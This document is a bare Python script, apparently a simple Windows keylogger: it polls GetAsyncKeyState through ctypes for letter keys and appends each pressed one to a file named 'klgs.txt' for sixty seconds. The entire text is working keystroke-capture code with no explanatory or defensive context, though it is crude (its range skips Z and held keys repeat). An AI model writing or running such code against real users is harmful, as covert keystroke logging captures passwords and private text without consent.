```python
import ctypes
import time

user32 = ctypes.WinDLL('user32', use_last_error=True)

def get_key_state(vk):
    return user32.GetAsyncKeyState(vk) & 0x8000 != 0

def write_to_file(char, filename='klgs.txt'):
    try:
        with open(filename, 'a') as f:
            f.write(char)
    except Exception as e:
        print(f'An error occurred: {e}')

def main():
    start_time = time.time()
    while True:
        for i in range(0x41, 0x5A): # A-Z
            if get_key_state(i):
                write_to_file(chr(i))
        if time.time() - start_time > 60: # Limit to 60 seconds
            break
main()
```